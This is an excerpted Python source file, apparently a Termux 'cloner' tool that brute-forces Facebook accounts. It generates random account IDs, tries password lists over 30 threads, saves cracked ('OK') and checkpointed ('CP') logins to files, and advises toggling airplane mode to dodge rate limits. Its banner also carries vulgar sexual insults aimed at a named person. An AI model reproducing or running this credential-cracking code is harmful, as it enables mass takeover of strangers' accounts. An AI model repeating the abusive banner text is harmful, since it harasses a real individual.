...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Mafiaasad/test/blob/main/a.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/UR.0FF1C14L.D4D.F7.454D.M4F14")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ MESSENGER🔰🥰https://www.facebook.com/UR.0FF1C14L.D4D.F7.454D.M4F14")
	subprocess.check_output(["am", "start", "https://www.facebook.com/UR.0FF1C14L.D4D.F7.454D.M4F14"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Mafiaasad/test/blob/main/a.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : ASAD ULLAH   
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : BOSDK11 BS SAIM KE MAA KE GROUP JOIN KRNE KA MANN KRTA H😩
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : HUMAYAINASAD
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : SAIM TERE M44 KE CHOOT ME UNGL14N KRO EK BAR IB AJAO BS
033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSAPP  :  BOSRI KE WHATSAPP BANNED HOGYA HI
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sMR BLACK🖕 PROO CLONER🖕"%(G,R,G,B,G))
	...
	def shanto9(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [+] OK RESULTS SAVED IN -> ok.ASAD"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.ASAD"%(Y))
	...
	def shanto4(self):
		...
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BBOSRI KE :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [+] OK RESULTS SAVED IN -> ok.ASAD"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.ASAD"%(Y))
				print("%s [!] BOSRII WALE IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
	...
	def old4_7(self):
		...
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BOSRII KE :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.ASAD"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.ASAD"%(R))
				print("%s [!] BOSRII WALEIF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
	...
	def old_11(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [+] OK RESULTS SAVED IN -> ok.ASAD"%(G))
				print("%s [+] CP RESULTS SAVED IN -> cp.ASAD"%(Y))
				print("%s [!] BOSRRII WALE IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
	...
	def email(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.ASAD"%(G))
				print("%s [+] CP RESULT SAVED IN -> cp.ASAD"%(Y))
				print("%s [!] BOSRII WALE IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
